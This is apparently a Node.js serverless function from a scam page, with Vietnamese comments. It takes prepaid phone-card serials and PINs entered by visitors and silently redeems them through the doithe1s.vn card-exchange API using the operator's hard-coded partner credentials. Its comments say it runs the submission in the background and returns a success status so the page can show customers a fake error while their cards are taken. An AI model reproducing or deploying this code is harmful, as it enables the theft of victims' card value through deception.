const axios = require('axios');
const crypto = require('crypto');

exports.handler = async (event) => {
    // Chỉ chấp nhận dữ liệu gửi lên qua phương thức POST
    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }

    try {
        // Lấy dữ liệu thẻ từ giao diện gửi lên
        const data = JSON.parse(event.body);
        
        // THÔNG TIN TÀI KHOẢN DOITHE1S CỦA BẠN
        const partner_id = '72845595642'; 
        const partner_key = 'a2beb524331cd657fbc016fcd6cc21c9'; 

        // Tạo chữ ký MD5 bảo mật theo yêu cầu của hệ thống
        const sign = crypto.createHash('md5')
            .update(partner_key + data.pin + data.seri)
            .digest('hex');

        // GỬI THẺ SANG DOITHE1S.VN (CHẠY NGẦM)
        const response = await axios.post('https://doithe1s.vn/api/card-auto', new URLSearchParams({
            type: data.type,
            amount: data.amount,
            serial: data.seri,
            pin: data.pin,
            partner_id: partner_id,
            request_id: Date.now().toString(), // Tạo mã đơn hàng ngẫu nhiên
            sign: sign
        }).toString(), {
            headers: { 
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' 
            }
        });

        // Trả về trạng thái OK để giao diện tiếp tục đếm ngược 5 giây
        return {
            statusCode: 200,
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ status: 1, message: "Đã nhận dữ liệu" })
        };

    } catch (error) {
        // Ngay cả khi lỗi kết nối, vẫn trả về 200 để giao diện hiện lỗi giả cho khách
        return {
            statusCode: 200, 
            body: JSON.stringify({ status: 0, message: "Lỗi xử lý" })
        };
    }
};
